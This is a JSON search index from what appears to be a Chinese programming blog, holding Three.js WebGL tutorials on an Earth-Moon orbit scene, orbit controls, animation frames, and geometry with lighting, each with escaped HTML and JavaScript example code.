[{"id":"c000f7024ccb6c476e7ef6fa4b60fe28","title":"Three.Js开发WebGL地月环绕","content":"Three.Js开发WebGL地月环绕\n\n\n\n\n\n\n\n\nThree.Js GitHub地址：点击跳转\n\n\n\n\n\n\n\n\n\nThree.Js API说明文档：点击跳转\n\n\n\n\n\n\n\n\n\n或复制网页端Three.js源码使用：点击跳转\n\n\n\n\n\n\n\n\n\n演示网站：点击跳转\n完整实例代码：&lt;!doctype html&gt;\n&lt;html lang&#x3D;&quot;zh-CN&quot;&gt;\n&lt;head&gt;\n    &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;\n    &lt;meta name&#x3D;&quot;viewport&quot; content&#x3D;&quot;width&#x3D;device-width, user-scalable&#x3D;no, initial-scale&#x3D;1.0, maximum-scale&#x3D;1.0, minimum-scale&#x3D;1.0&quot;&gt;\n    &lt;meta http-equiv&#x3D;&quot;X-UA-Compatible&quot; content&#x3D;&quot;IE&#x3D;Edge&quot;&gt;\n    &lt;title&gt;3D地月环绕&lt;&#x2F;title&gt;\n    &lt;style type&#x3D;&quot;text&#x2F;css&quot;&gt;\n        *&#123;\n            margin: 0;\n            padding: 0;\n        &#125;\n        &#x2F;* 背景 *&#x2F;\n        canvas&#123;\n            background-image: url(resource&#x2F;Demo04&#x2F;imgs&#x2F;starts.jpg);\n            background-size: cover;\n        &#125;\n        .label&#123;\n            color: #FFF;\n            font-size: 16px;\n        &#125;\n    &lt;&#x2F;style&gt;\n    &lt;script type&#x3D;&quot;module&quot;&gt;\n        import *as THREE from &#39;&#x2F;libs&#x2F;build&#x2F;three.module.js&#39;;\n        import &#123; OrbitControls &#125; from &#39;&#x2F;libs&#x2F;jsm&#x2F;controls&#x2F;OrbitControls.js&#39;;\n        import &#123; CSS2DRenderer,CSS2DObject &#125; from &#39;&#x2F;libs&#x2F;jsm&#x2F;renderers&#x2F;CSS2DRenderer.js&#39;;\n\n        &#x2F;&#x2F; 声明全局变量\n        let camera,scene,renderer,labelRenderer;\n        let moon,earth;\n        let clock &#x3D; new THREE.Clock();\n        const textureLoader &#x3D; new THREE.TextureLoader();    &#x2F;&#x2F; 实例化纹理加载器\n\n        function init()&#123;\n            &#x2F;&#x2F; 地球月球半径大小\n            const EARTH_RADIUS &#x3D; 2.5;\n            const MOON_RADIUS &#x3D; 0.27;\n            &#x2F;&#x2F; 透视相机\n            camera &#x3D; new THREE.PerspectiveCamera(45,window.innerWidth&#x2F;window.innerHeight,0.1,200);\n            camera.position.set(10,5,20);\n            &#x2F;&#x2F; 实例化场景\n            scene &#x3D; new THREE.Scene();\n            &#x2F;&#x2F; 聚光灯\n            const dirLight &#x3D; new THREE.SpotLight(0xFFFFFF);\n            dirLight.position.set(0,0,10);\n            dirLight.intensity &#x3D; 2; &#x2F;&#x2F; 光源强度\n            dirLight.castShadow &#x3D; true; &#x2F;&#x2F; 光照阴影\n            scene.add(dirLight);\n            &#x2F;&#x2F; 添加环境光\n            const aLight &#x3D; new THREE.AmbientLight(0xFFFFFF);\n            aLight.intensity &#x3D; 0.3; &#x2F;&#x2F; 调整环境光亮度\n            scene.add(aLight);\n\n            &#x2F;&#x2F; 月球\n            const moonGeometry &#x3D; new THREE.SphereGeometry(MOON_RADIUS,16,16);\n            const moonMaterial &#x3D; new THREE.MeshPhongMaterial(&#123; map:textureLoader.load(&#39;resource&#x2F;Demo04&#x2F;textures&#x2F;planets&#x2F;moon_1024.jpg&#39;) &#125;); &#x2F;&#x2F; 可高光材质\n            moon &#x3D; new THREE.Mesh(moonGeometry,moonMaterial);\n            moon.receiveShadow &#x3D; true; &#x2F;&#x2F; 接收阴影\n            moon.castShadow &#x3D; true;\n            scene.add(moon);\n            &#x2F;&#x2F; 地球\n            const earthGeometry &#x3D; new THREE.SphereGeometry(EARTH_RADIUS,16,16);\n            const earthMaterial &#x3D; new THREE.MeshPhongMaterial(&#123;\n                shininess:5,    &#x2F;&#x2F; 调低镜面反射\n                map:textureLoader.load(&#39;resource&#x2F;Demo04&#x2F;textures&#x2F;planets&#x2F;earth_atmos_2048.jpg&#39;),\n                specularMap:textureLoader.load(&#39;resource&#x2F;Demo04&#x2F;textures&#x2F;planets&#x2F;earth_specular_2048.jpg&#39;),\n                normalMap:textureLoader.load(&#39;resource&#x2F;Demo04&#x2F;textures&#x2F;planets&#x2F;earth_normal_2048.jpg&#39;)\n            &#125;)\n            earth &#x3D; new THREE.Mesh(earthGeometry,earthMaterial);\n            earth.receiveShadow &#x3D; true; &#x2F;&#x2F; 接收阴影\n            earth.castShadow &#x3D; true;\n            scene.add(earth);\n\n            &#x2F;&#x2F; 地球标签\n            const earthDiv &#x3D; document.createElement(&#39;div&#39;);\n            earthDiv.className &#x3D; &#39;label&#39;;\n            earthDiv.textContent &#x3D; &#39;地球&#39;;\n            const eartchLabel &#x3D; new CSS2DObject(earthDiv);\n            eartchLabel.position.set(0,EARTH_RADIUS+0.5,0);\n            earth.add(eartchLabel);\n            &#x2F;&#x2F; 月球标签\n            const MoonDiv &#x3D; document.createElement(&#39;div&#39;);\n            MoonDiv.className &#x3D; &#39;label&#39;;\n            MoonDiv.textContent &#x3D; &#39;月球&#39;;\n            const MoonLabel &#x3D; new CSS2DObject(MoonDiv);\n            MoonLabel.position.set(0,MOON_RADIUS+0.5,0);\n            moon.add(MoonLabel);\n\n            &#x2F;&#x2F; 渲染器\n            renderer &#x3D; new THREE.WebGLRenderer(&#123;\n                alpha:true  &#x2F;&#x2F; 透明度\n            &#125;);\n            renderer.setPixelRatio(window.devicePixelRatio);   &#x2F;&#x2F; 像素比\n            renderer.setSize(window.innerWidth,window.innerHeight);\n            renderer.shadowMap.enabled &#x3D; true;   &#x2F;&#x2F; 渲染阴影\n            document.body.appendChild(renderer.domElement); &#x2F;&#x2F; 渲染到页面\n\n            &#x2F;&#x2F; 标签渲染器\n            labelRenderer &#x3D; new CSS2DRenderer();\n            labelRenderer.setSize(window.innerWidth,window.innerHeight);\n            labelRenderer.domElement.style.position &#x3D; &#39;absolute&#39;;\n            labelRenderer.domElement.style.top &#x3D; &#39;0px&#39;;\n            document.body.appendChild(labelRenderer.domElement);\n\n            &#x2F;&#x2F; 绑定三维场景控制器\n            const controls &#x3D; new OrbitControls(camera,labelRenderer.domElement);\n            controls.addEventListener(&#39;change&#39;,()&#x3D;&gt;&#123;\n                renderer.render(scene,camera);\n                labelRenderer.render(scene,camera);\n            &#125;)\n        &#125;\n        var oldTime &#x3D; 0;\n        &#x2F;&#x2F; 渲染动画函数\n        function animate()&#123;\n            const elapsed &#x3D; clock.getElapsedTime(); &#x2F;&#x2F; 获取时间\n            moon.position.set(Math.sin(elapsed)*5,0,Math.cos(elapsed)*5);    &#x2F;&#x2F; (时间*半径)\n            &#x2F;&#x2F; 地球自转\n            let axis &#x3D; new THREE.Vector3(0,1,0); &#x2F;&#x2F; 环绕 Y 轴\n            earth.rotateOnAxis(axis,(elapsed - oldTime) * Math.PI &#x2F; 10);  &#x2F;&#x2F; 1s 转一下\n            renderer.render(scene,camera);\n            labelRenderer.render(scene,camera);\n            oldTime &#x3D; elapsed;\n            requestAnimationFrame(animate);\n        &#125;\n\n        init()\n        animate()\n\n        &#x2F;&#x2F; 自动调整摄像机\n        window.onreset &#x3D; function ()&#123;\n            camera.aspect &#x3D; window.innerWidth&#x2F;window.innerHeight;\n            camera.updateProjectionMatrix();\n            renderer.setSize(window.innerWidth,window.innerHeight);\n        &#125;\n    &lt;&#x2F;script&gt;\n&lt;&#x2F;head&gt;\n\n&lt;body&gt;\n\n&lt;&#x2F;body&gt;\n\n&lt;&#x2F;html&gt;","slug":"ThreeJsWebGL_2022_4.20.01","date":"2022-04-21T07:19:00.000Z","categories_index":"程序","tags_index":"教学文档,博客网站","author_index":"Arvin"},{"id":"78bba4eb245f0658532280227722a7b2","title":"Three.Js开发WebGL鼠标操作三维场景","content":"Three.Js开发WebGL鼠标操作三维场景\n\n\n\n\n\n\n\n\nThree.Js GitHub地址：点击跳转\n\n\n\n\n\n\n\n\n\nThree.Js API说明文档：点击跳转\n\n\n\n\n\n\n\n\n\n或复制网页端Three.js源码使用：点击跳转\nWEBGL 三维控制器(放置在Script标签下)： &#x2F;&#x2F; 三维场景控制器渲染\nvar controls &#x3D; new THREE.OrbitControls(camera,renderer.domElement);   &#x2F;&#x2F; 参数：(绑定的摄像机,要事件监听的HTML元素)\n&#x2F;&#x2F; 监听控制器鼠标事件\ncontrols.addEventListener(&#39;change&#39;,()&#x3D;&gt;&#123;\n    renderer.render(scene,camera);\n&#125;);\nOrbitControls 必须将要被控制的相机。该相机不允许是其他任何对象的子级，除非该对象是场景自身。\n注意：这里为优化阴影反射效果对聚光灯属性进行了设置调整\nspotLight.angle &#x3D; Math.PI &#x2F; 10;  &#x2F;&#x2F; 聚光灯扩散范围\nspotLight.shadow.penumbra &#x3D; 0.05    &#x2F;&#x2F; 阴影衰减情况\nspotLight.shadow.mapSize.window &#x3D; 1024; &#x2F;&#x2F; 设置阴影精度\nspotLight.shadow.mapSize.innerHeight &#x3D; 1024;\n\n完整实例代码：&lt;!doctype html&gt;\n&lt;html lang&#x3D;&quot;zh-CN&quot;&gt;\n&lt;head&gt;\n    &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;\n    &lt;meta name&#x3D;&quot;viewport&quot; content&#x3D;&quot;width&#x3D;device-width, user-scalable&#x3D;no, initial-scale&#x3D;1.0, maximum-scale&#x3D;1.0, minimum-scale&#x3D;1.0&quot;&gt;\n    &lt;meta http-equiv&#x3D;&quot;X-UA-Compatible&quot; content&#x3D;&quot;IE&#x3D;Edge&quot;&gt;\n    &lt;title&gt;Demo-01&lt;&#x2F;title&gt;\n    &lt;script src&#x3D;&quot;libs&#x2F;build&#x2F;three.js&quot;&gt;&lt;&#x2F;script&gt;\n    &lt;script src&#x3D;&quot;libs&#x2F;js&#x2F;controls&#x2F;OrbitControls.js&quot;&gt;&lt;&#x2F;script&gt;\n    &lt;style&gt;\n        body&#123;\n            margin: 0;\n            overflow: hidden;\n        &#125;\n    &lt;&#x2F;style&gt;\n&lt;&#x2F;head&gt;\n\n&lt;body&gt;\n\n&lt;div id&#x3D;&quot;webGl-output&quot;&gt;\n\n&lt;&#x2F;div&gt;\n\n&lt;!-- Script --&gt;\n&lt;script&gt;\n    function init()&#123;\n        &#x2F;&#x2F; 创建场景\n        var scene &#x3D; new THREE.Scene();\n        &#x2F;&#x2F; 设置摄像机 (45度,长宽比&lt;当前屏幕宽&#x2F;屏幕高&gt;,最近可视距离,最远可视距离)\n        var camera &#x3D; new THREE.PerspectiveCamera(45,window.innerWidth&#x2F;window.innerHeight,0.1,2000);\n        &#x2F;&#x2F; 创建渲染器\n        var renderer &#x3D; new THREE.WebGLRenderer();\n        &#x2F;&#x2F; 渲染器初始化颜色\n        renderer.setClearColor(new THREE.Color(0xEEEEEE));\n        &#x2F;&#x2F; 渲染输出 Canvas 画面大小\n        renderer.setSize(window.innerWidth,window.innerHeight);\n        &#x2F;&#x2F; 设置渲染物体阴影\n        renderer.shadowMapEnabled &#x3D; true;\n        &#x2F;&#x2F; 创建显示卡迪坐标轴\n        var axes &#x3D; new THREE.AxesHelper(20);\n        &#x2F;&#x2F; 添加坐标系到场景\n        scene.add(axes);\n        &#x2F;&#x2F; 场景创建平面(地面几何体)\n        var planeGeometry &#x3D; new THREE.PlaneGeometry(60,20);\n        &#x2F;&#x2F; 设置平面(地面)材质\n        var PlaneMaterial &#x3D; new THREE.MeshStandardMaterial(&#123;color:0xCCCCCC&#125;);\n        &#x2F;&#x2F; 创建地面 通过 THREE.Mesh 进行结合操作\n        var plane &#x3D; new THREE.Mesh(planeGeometry,PlaneMaterial);\n        &#x2F;&#x2F; 物体位移坐标\n        plane.rotation.x &#x3D; -0.5*Math.PI;\n        plane.position.x &#x3D; 0;\n        plane.position.y &#x3D; 0;\n        plane.position.z &#x3D; 0;\n        &#x2F;&#x2F; 设置地面接收阴影\n        plane.castShadow &#x3D; true;\n        plane.receiveShadow &#x3D; true;\n        &#x2F;&#x2F; 将地面添加到场景\n        scene.add(plane);\n\n        &#x2F;&#x2F; 添加立方体\n        var cubeGeometry &#x3D; new THREE.BoxGeometry(4,4,4);\n        var cubeMaterial &#x3D; new THREE.MeshLambertMaterial(&#123;color: 0xFFB6C1&#125;); &#x2F;&#x2F; 添加网格材质\n        var cube &#x3D; new THREE.Mesh(cubeGeometry,cubeMaterial);\n        cube.position.x &#x3D; 0;\n        cube.position.y &#x3D; 5;\n        cube.position.z &#x3D; 2;\n        &#x2F;&#x2F; 球体\n        var sphereGeometry &#x3D; new THREE.SphereGeometry(4,20,20);\n        var sphereMaterial &#x3D; new THREE.MeshLambertMaterial(&#123;color: 0xFFB6C1&#125;);\n        var Sphere &#x3D; new THREE.Mesh(sphereGeometry,sphereMaterial);\n        Sphere.position.x &#x3D; 10;\n        Sphere.position.y &#x3D; 4;\n        Sphere.position.z &#x3D; 2;\n        &#x2F;&#x2F; 对象是否渲染到阴影贴图\n        cube.castShadow &#x3D; true;\n        Sphere.castShadow &#x3D; true;\n        scene.add(cube)\n        scene.add(Sphere);\n\n        &#x2F;&#x2F; 创建添加聚光灯\n        var spotLight &#x3D; new THREE.SpotLight(0xFFFFFF);\n        spotLight.position.set(130,130,-130);\n        spotLight.castShadow &#x3D; true;\n        spotLight.angle &#x3D; Math.PI &#x2F; 10;  &#x2F;&#x2F; 聚光灯扩散范围\n        spotLight.shadow.penumbra &#x3D; 0.05    &#x2F;&#x2F; 阴影衰减情况\n        spotLight.shadow.mapSize.window &#x3D; 1024; &#x2F;&#x2F; 设置阴影精度\n        spotLight.shadow.mapSize.innerHeight &#x3D; 1024;\n\n        scene.add(spotLight);\n\n        &#x2F;&#x2F; 定位摄影机视角指向场景中心点\n        camera.position.x &#x3D; 30;\n        camera.position.y &#x3D; 30;\n        camera.position.z &#x3D; 30;\n        camera.lookAt(scene.position)\n        &#x2F;&#x2F; 渲染器输出添加至 HTML\n        document.getElementById(&#39;webGl-output&#39;).appendChild(renderer.domElement);\n        &#x2F;&#x2F; 最终渲染\n        renderer.render(scene,camera);\n\n        &#x2F;&#x2F; 三维场景控制器渲染\n        var controls &#x3D; new THREE.OrbitControls(camera,renderer.domElement);   &#x2F;&#x2F; 参数：(绑定的摄像机,要事件监听的HTML元素)\n        &#x2F;&#x2F; 监听控制器鼠标事件\n        controls.addEventListener(&#39;change&#39;,()&#x3D;&gt;&#123;\n            renderer.render(scene,camera);\n        &#125;);\n\n        &#x2F;&#x2F; 计算渲染时间\n        let T0 &#x3D; new Date();\n\n        &#x2F;&#x2F; 渲染函数\n        function render()&#123;\n            let T1 &#x3D; new Date();\n            let T &#x3D; T1 - T0;    &#x2F;&#x2F;  T 为时间差\n            T0 &#x3D; T1;\n            renderer.render(scene,camera);\n            cube.rotateY(0.001 * T); &#x2F;&#x2F; 每1毫旋转0.001 * 时间差\n            window.requestAnimationFrame(render);   &#x2F;&#x2F; 递归\n        &#125;\n        &#x2F;&#x2F; 请求动画帧\n        window.requestAnimationFrame(render);\n    &#125;\n    window.onload &#x3D; init    &#x2F;&#x2F; 全部加载完成后运行\n&lt;&#x2F;script&gt;\n&lt;&#x2F;body&gt;\n&lt;&#x2F;html&gt;","slug":"ThreeJsWebGL_2022_4.19.04","date":"2022-04-20T07:43:00.000Z","categories_index":"程序","tags_index":"教学文档,博客网站","author_index":"Arvin"},{"id":"25cfc3fbb38e9037315da011452084c9","title":"Three.Js开发WebGL动画实现与请求动画帧","content":"Three.Js开发WebGL动画实现与请求动画帧\n\n\n\n\n\n\n\n\nThree.Js GitHub地址：点击跳转\n\n\n\n\n\n\n\n\n\nThree.Js API说明文档：点击跳转\n\n\n\n\n\n\n\n\n\n或复制网页端Three.js源码使用：点击跳转\nWEBGL 动画实现与请求动画帧(放置在Script标签下)：动画渲染函数(不推荐使用：如果性能不足情况下间隔函数有可能形成卡帧现象)\nfunction render()&#123;\n    renderer.render(scene,camera);\n    cube.rotateY(0.01); &#x2F;&#x2F; 每帧绕 Y 轴旋转 0.01 弧度\n&#125;\nsetInterval(render,16); &#x2F;&#x2F; 间隔函数 16毫秒旋转一次 60帧1s\n采用请求动画帧的方式可以确保我们的动画不会出现卡帧现象\n&#x2F;&#x2F; 渲染函数\nfunction render()&#123;\n    renderer.render(scene,camera);\n    cube.rotateY(0.01);\n    window.requestAnimationFrame(render);   &#x2F;&#x2F; 递归\n&#125;\n&#x2F;&#x2F; 请求动画帧\nwindow.requestAnimationFrame(render);\nrequestAnimationFrame 很好的一个特点，它会按照浏览器的性能合理的安排计算和渲染。\nrequestAnimationFrame 请求间隔时间是不定的，所以我们要配套的进行时间的计算。\n&#x2F;&#x2F; 计算渲染时间\nlet T0 &#x3D; new Date();\n\n&#x2F;&#x2F; 渲染函数\nfunction render()&#123;\n    let T1 &#x3D; new Date();\n    let T &#x3D; T1 - T0;    &#x2F;&#x2F;  T 为时间差\n    T0 &#x3D; T1;\n    renderer.render(scene,camera);\n    cube.rotateY(0.001 * T); &#x2F;&#x2F; 每1毫旋转0.001 * 时间差\n    window.requestAnimationFrame(render);   &#x2F;&#x2F; 递归\n&#125;\n&#x2F;&#x2F; 请求动画帧\nwindow.requestAnimationFrame(render);\n\n完整实例代码：&lt;!doctype html&gt;\n&lt;html lang&#x3D;&quot;zh-CN&quot;&gt;\n&lt;head&gt;\n    &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;\n    &lt;meta name&#x3D;&quot;viewport&quot; content&#x3D;&quot;width&#x3D;device-width, user-scalable&#x3D;no, initial-scale&#x3D;1.0, maximum-scale&#x3D;1.0, minimum-scale&#x3D;1.0&quot;&gt;\n    &lt;meta http-equiv&#x3D;&quot;X-UA-Compatible&quot; content&#x3D;&quot;IE&#x3D;Edge&quot;&gt;\n    &lt;title&gt;Demo-01&lt;&#x2F;title&gt;\n    &lt;script src&#x3D;&quot;libs&#x2F;Three.js&quot;&gt;&lt;&#x2F;script&gt;\n    &lt;style&gt;\n        body&#123;\n            margin: 0;\n            overflow: hidden;\n        &#125;\n    &lt;&#x2F;style&gt;\n&lt;&#x2F;head&gt;\n\n&lt;body&gt;\n\n&lt;div id&#x3D;&quot;webGl-output&quot;&gt;\n\n&lt;&#x2F;div&gt;\n\n&lt;!-- Script --&gt;\n&lt;script&gt;\n    function init()&#123;\n        &#x2F;&#x2F; 创建场景\n        var scene &#x3D; new THREE.Scene();\n        &#x2F;&#x2F; 设置摄像机 (45度,长宽比&lt;当前屏幕宽&#x2F;屏幕高&gt;,最近可视距离,最远可视距离)\n        var camera &#x3D; new THREE.PerspectiveCamera(45,window.innerWidth&#x2F;window.innerHeight,0.1,2000);\n        &#x2F;&#x2F; 创建渲染器\n        var renderer &#x3D; new THREE.WebGLRenderer();\n        &#x2F;&#x2F; 渲染器初始化颜色\n        renderer.setClearColor(new THREE.Color(0xEEEEEE));\n        &#x2F;&#x2F; 渲染输出 Canvas 画面大小\n        renderer.setSize(window.innerWidth,window.innerHeight);\n        &#x2F;&#x2F; 设置渲染物体阴影\n        renderer.shadowMapEnabled &#x3D; true;\n        &#x2F;&#x2F; 创建显示卡迪坐标轴\n        var axes &#x3D; new THREE.AxesHelper(20);\n        &#x2F;&#x2F; 添加坐标系到场景\n        scene.add(axes);\n        &#x2F;&#x2F; 场景创建平面(地面几何体)\n        var planeGeometry &#x3D; new THREE.PlaneGeometry(60,20);\n        &#x2F;&#x2F; 设置平面(地面)材质\n        var PlaneMaterial &#x3D; new THREE.MeshBasicMaterial(&#123;color:0xCCCCCC&#125;);\n        &#x2F;&#x2F; 创建地面 通过 THREE.Mesh 进行结合操作\n        var plane &#x3D; new THREE.Mesh(planeGeometry,PlaneMaterial);\n        &#x2F;&#x2F; 物体位移坐标\n        plane.rotation.x &#x3D; -0.5*Math.PI;\n        plane.position.x &#x3D; 0;\n        plane.position.y &#x3D; 0;\n        plane.position.z &#x3D; 0;\n        &#x2F;&#x2F;- 设置地面接收阴影\n        plane.castShadow &#x3D; true;\n        plane.receiveShadow &#x3D; true;\n        &#x2F;&#x2F; 将地面添加到场景\n        scene.add(plane);\n\n        &#x2F;&#x2F; 添加立方体\n        var cubeGeometry &#x3D; new THREE.BoxGeometry(4,4,4);\n        var cubeMaterial &#x3D; new THREE.MeshLambertMaterial(&#123;color: 0xFFB6C1&#125;); &#x2F;&#x2F; 添加网格材质\n        var cube &#x3D; new THREE.Mesh(cubeGeometry,cubeMaterial);\n        cube.position.x &#x3D; 0;\n        cube.position.y &#x3D; 5;\n        cube.position.z &#x3D; 2;\n        &#x2F;&#x2F; 球体\n        var sphereGeometry &#x3D; new THREE.SphereGeometry(4,20,20);\n        var sphereMaterial &#x3D; new THREE.MeshLambertMaterial(&#123;color: 0xFFB6C1&#125;);\n        var Sphere &#x3D; new THREE.Mesh(sphereGeometry,sphereMaterial);\n        Sphere.position.x &#x3D; 10;\n        Sphere.position.y &#x3D; 4;\n        Sphere.position.z &#x3D; 2;\n        &#x2F;&#x2F; 对象是否渲染到阴影贴图\n        cube.castShadow &#x3D; true;\n        Sphere.castShadow &#x3D; true;\n        scene.add(cube)\n        scene.add(Sphere);\n\n        &#x2F;&#x2F; 创建添加聚光灯\n        var spotLight &#x3D; new THREE.SpotLight(0xFFFFFF);\n        spotLight.position.set(130,130,-130);\n        spotLight.castShadow &#x3D; true;\n        scene.add(spotLight);\n\n        &#x2F;&#x2F; 定位摄影机视角指向场景中心点\n        camera.position.x &#x3D; 30;\n        camera.position.y &#x3D; 30;\n        camera.position.z &#x3D; 30;\n        camera.lookAt(scene.position)\n        &#x2F;&#x2F; 渲染器输出添加至 HTML\n        document.getElementById(&#39;webGl-output&#39;).appendChild(renderer.domElement);\n        &#x2F;&#x2F; 最终渲染\n        renderer.render(scene,camera);\n\n        &#x2F;&#x2F; 计算渲染时间\n        let T0 &#x3D; new Date();\n\n        &#x2F;&#x2F; 渲染函数\n        function render()&#123;\n            let T1 &#x3D; new Date();\n            let T &#x3D; T1 - T0;    &#x2F;&#x2F;  T 为时间差\n            T0 &#x3D; T1;\n            renderer.render(scene,camera);\n            cube.rotateY(0.001 * T); &#x2F;&#x2F; 每1毫旋转0.001 * 时间差\n            window.requestAnimationFrame(render);   &#x2F;&#x2F; 递归\n        &#125;\n        &#x2F;&#x2F; 请求动画帧\n        window.requestAnimationFrame(render);\n    &#125;\n    window.onload &#x3D; init    &#x2F;&#x2F; 全部加载完成后运行\n&lt;&#x2F;script&gt;\n&lt;&#x2F;body&gt;\n&lt;&#x2F;html&gt;","slug":"ThreeJsWebGL_2022_4.19.03","date":"2022-04-19T10:01:00.000Z","categories_index":"程序","tags_index":"教学文档,博客网站","author_index":"Arvin"},{"id":"c5d768a47af4502a09d48bf7f4ff02d4","title":"Three.Js开发WebGL创建几何体及灯光","content":"Three.Js开发WebGL创建几何体及灯光\n\n\n\n\n\n\n\n\nThree.Js GitHub地址：点击跳转\n\n\n\n\n\n\n\n\n\nThree.Js API说明文档：点击跳转\n\n\n\n\n\n\n\n\n\n或复制网页端Three.js源码使用：点击跳转\nWEBGL 三维几何体及灯光的创建(放置在Script标签下)： &#x2F;&#x2F; 添加立方体\nvar cubeGeometry &#x3D; new THREE.BoxGeometry(4,4,4);\nvar cubeMaterial &#x3D; new THREE.MeshLambertMaterial(&#123;color: 0xFFB6C1&#125;); &#x2F;&#x2F; 添加网格材质\nvar cube &#x3D; new THREE.Mesh(cubeGeometry,cubeMaterial);\ncube.position.x &#x3D; 0;\ncube.position.y &#x3D; 5;\ncube.position.z &#x3D; 2;\n&#x2F;&#x2F; 球体\nvar sphereGeometry &#x3D; new THREE.SphereGeometry(4,20,20);\nvar sphereMaterial &#x3D; new THREE.MeshLambertMaterial(&#123;color: 0xFFB6C1&#125;);\nvar Sphere &#x3D; new THREE.Mesh(sphereGeometry,sphereMaterial);\nSphere.position.x &#x3D; 10;\nSphere.position.y &#x3D; 4;\nSphere.position.z &#x3D; 2;\n&#x2F;&#x2F; 对象是否渲染到阴影贴图\ncube.castShadow &#x3D; true;\nSphere.castShadow &#x3D; true;\nscene.add(cube)\nscene.add(Sphere);\n\n&#x2F;&#x2F; 创建添加聚光灯\nvar spotLight &#x3D; new THREE.SpotLight(0xFFFFFF);\nspotLight.position.set(130,130,-130);\nspotLight.castShadow &#x3D; true;\nscene.add(spotLight);\n\n阴影属性设置\n&#x2F;&#x2F; 设置渲染物体阴影\nrenderer.shadowMapEnabled &#x3D; true;\n&#x2F;&#x2F; 设置地面接收阴影\nplane.castShadow &#x3D; true;\nplane.receiveShadow &#x3D; true;\n\n完整实例代码：&lt;!doctype html&gt;\n&lt;html lang&#x3D;&quot;zh-CN&quot;&gt;\n&lt;head&gt;\n    &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;\n    &lt;meta name&#x3D;&quot;viewport&quot; content&#x3D;&quot;width&#x3D;device-width, user-scalable&#x3D;no, initial-scale&#x3D;1.0, maximum-scale&#x3D;1.0, minimum-scale&#x3D;1.0&quot;&gt;\n    &lt;meta http-equiv&#x3D;&quot;X-UA-Compatible&quot; content&#x3D;&quot;IE&#x3D;Edge&quot;&gt;\n    &lt;title&gt;Demo-01&lt;&#x2F;title&gt;\n    &lt;script src&#x3D;&quot;libs&#x2F;Three.js&quot;&gt;&lt;&#x2F;script&gt;\n    &lt;style&gt;\n        body&#123;\n            margin: 0;\n            overflow: hidden;\n        &#125;\n    &lt;&#x2F;style&gt;\n&lt;&#x2F;head&gt;\n\n&lt;body&gt;\n\n&lt;div id&#x3D;&quot;webGl-output&quot;&gt;\n\n&lt;&#x2F;div&gt;\n\n&lt;!-- Script --&gt;\n&lt;script&gt;\n    function init()&#123;\n        &#x2F;&#x2F; 创建场景\n        var scene &#x3D; new THREE.Scene();\n        &#x2F;&#x2F; 设置摄像机 (45度,长宽比&lt;当前屏幕宽&#x2F;屏幕高&gt;,最近可视距离,最远可视距离)\n        var camera &#x3D; new THREE.PerspectiveCamera(45,window.innerWidth&#x2F;window.innerHeight,0.1,2000);\n        &#x2F;&#x2F; 创建渲染器\n        var renderer &#x3D; new THREE.WebGLRenderer();\n        &#x2F;&#x2F; 渲染器初始化颜色\n        renderer.setClearColor(new THREE.Color(0xEEEEEE));\n        &#x2F;&#x2F; 渲染输出 Canvas 画面大小\n        renderer.setSize(window.innerWidth,window.innerHeight);\n        &#x2F;&#x2F; 设置渲染物体阴影\n        renderer.shadowMapEnabled &#x3D; true;\n        &#x2F;&#x2F; 创建显示卡迪坐标轴\n        var axes &#x3D; new THREE.AxesHelper(20);\n        &#x2F;&#x2F; 添加坐标系到场景\n        scene.add(axes);\n        &#x2F;&#x2F; 场景创建平面(地面几何体)\n        var planeGeometry &#x3D; new THREE.PlaneGeometry(60,20);\n        &#x2F;&#x2F; 设置平面(地面)材质\n        var PlaneMaterial &#x3D; new THREE.MeshBasicMaterial(&#123;color:0xCCCCCC&#125;);\n        &#x2F;&#x2F; 创建地面 通过 THREE.Mesh 进行结合操作\n        var plane &#x3D; new THREE.Mesh(planeGeometry,PlaneMaterial);\n        &#x2F;&#x2F; 物体位移坐标\n        plane.rotation.x &#x3D; -0.5*Math.PI;\n        plane.position.x &#x3D; 0;\n        plane.position.y &#x3D; 0;\n        plane.position.z &#x3D; 0;\n        &#x2F;&#x2F;- 设置地面接收阴影\n        plane.castShadow &#x3D; true;\n        plane.receiveShadow &#x3D; true;\n        &#x2F;&#x2F; 将地面添加到场景\n        scene.add(plane);\n\n        &#x2F;&#x2F; 添加立方体\n        var cubeGeometry &#x3D; new THREE.BoxGeometry(4,4,4);\n        var cubeMaterial &#x3D; new THREE.MeshLambertMaterial(&#123;color: 0xFFB6C1&#125;); &#x2F;&#x2F; 添加网格材质\n        var cube &#x3D; new THREE.Mesh(cubeGeometry,cubeMaterial);\n        cube.position.x &#x3D; 0;\n        cube.position.y &#x3D; 5;\n        cube.position.z &#x3D; 2;\n        &#x2F;&#x2F; 球体\n        var sphereGeometry &#x3D; new THREE.SphereGeometry(4,20,20);\n        var sphereMaterial &#x3D; new THREE.MeshLambertMaterial(&#123;color: 0xFFB6C1&#125;);\n        var Sphere &#x3D; new THREE.Mesh(sphereGeometry,sphereMaterial);\n        Sphere.position.x &#x3D; 10;\n        Sphere.position.y &#x3D; 4;\n        Sphere.position.z &#x3D; 2;\n        &#x2F;&#x2F; 对象是否渲染到阴影贴图\n        cube.castShadow &#x3D; true;\n        Sphere.castShadow &#x3D; true;\n        scene.add(cube)\n        scene.add(Sphere);\n\n        &#x2F;&#x2F; 创建添加聚光灯\n        var spotLight &#x3D; new THREE.SpotLight(0xFFFFFF);\n        spotLight.position.set(130,130,-130);\n        spotLight.castShadow &#x3D; true;\n        scene.add(spotLight);\n\n        &#x2F;&#x2F; 定位摄影机视角指向场景中心点\n        camera.position.x &#x3D; 30;\n        camera.position.y &#x3D; 30;\n        camera.position.z &#x3D; 30;\n        camera.lookAt(scene.position)\n        &#x2F;&#x2F; 渲染器输出添加至 HTML\n        document.getElementById(&#39;webGl-output&#39;).appendChild(renderer.domElement);\n        &#x2F;&#x2F; 最终渲染\n        renderer.render(scene,camera);\n    &#125;\n    window.onload &#x3D; init    &#x2F;&#x2F; 全部加载完成后运行\n&lt;&#x2F;script&gt;\n&lt;&#x2F;body&gt;\n&lt;&#x2F;html&gt;","slug":"ThreeJsWebGL_2022_4.19.02","date":"2022-04-19T09:12:00.000Z","categories_index":"程序","tags_index":"教学文档,博客网站","author_index":"Arvin"},{"id":"4091de74866dc5d796232e6bf95938a1","title":"Three.Js开发WebGL创建三维空间","content":"Three.Js开发WebGL创建三维空间首先我们需要创建一个 HTML 文件 如：index.html\n导入Three.Js 与 设置网页初始化 (边距为0 